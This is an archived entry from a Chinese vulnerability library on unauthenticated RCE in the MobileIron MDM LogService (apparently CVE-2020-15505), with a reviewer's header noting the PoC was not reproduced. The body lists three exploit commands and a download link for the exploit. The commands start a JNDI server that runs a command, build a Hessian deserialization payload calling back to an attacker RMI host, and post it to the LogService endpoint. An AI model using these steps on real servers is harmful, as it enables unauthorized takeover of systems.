---
source: "白阁文库 BaizeSec/bylibrary"
id: "vw-75c0835ca6af88c5082c9304"
entity_id: "ve-75c0835ca6af88c5082c9304"
schema_version: "1"
title: "MobileIron MDM 未授权RCE EXP"
product: "MobileIron Core/MDM LogService"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2020-15505"
referenced_identifiers: ""
prerequisites: "Spring gadget/JNDI出站与JDK条件，未给版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/MobileIron/MobileIron%20MDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%20EXP.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# MobileIron MDM 未授权RCE EXP

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：MobileIron Core/MDM LogService
- 本文讨论：LogService Hessian反序列化，疑CVE-2020-15505需映射
- 版本、权限与配置前提：Spring gadget/JNDI出站与JDK条件，未给版本
- 资料类型：Hessian利用命令摘录；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅三条命令和网盘，无hessian.py源代码/构建/依赖版本
- 内嵌二次frontmatter；未指明实际Core/Sentry产品边界
- 与562同LogService但使用不同gadget，可互补不可当不同漏洞

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- CVE映射、库/JDK依赖及附件内容未核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


---
title: 'MobileIron MDM 未授权RCE EXP'
date: Tue, 15 Sep 2020 07:32:20 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 步骤

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C "<Command>"
java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://<server-ip>:1099/<codebase> > exp
python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService' 
```

EXP 链接：https://pan.baidu.com/s/1jna0ZY-8BqRETUkYiJr5RQ 提取码：nh3f


---

> 来源：白阁文库 BaizeSec/bylibrary
